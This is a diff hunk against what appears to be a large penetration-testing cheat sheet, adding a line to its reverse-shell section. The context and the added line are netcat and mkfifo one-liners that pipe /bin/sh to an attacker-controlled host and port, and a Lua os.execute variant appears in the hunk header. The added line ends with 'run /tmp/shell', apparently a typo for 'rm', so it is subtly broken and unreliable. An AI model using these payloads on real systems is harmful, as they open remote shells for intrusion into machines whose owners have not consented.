@@ -11201,6 +11201,7 @@ http://<RHOST>');os.execute("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|
 
 ```c
 mkfifo /tmp/shell; nc <LHOST> <LPORT> 0</tmp/shell | /bin/sh >/tmp/shell 2>&1; rm /tmp/shell
+mkfifo /tmp/shell; nc IP PORT 0</tmp/shell | /bin/sh > /tmp/shell 2>&1; run /tmp/shell
 ```
 
 ##### Netcat Reverse Shell
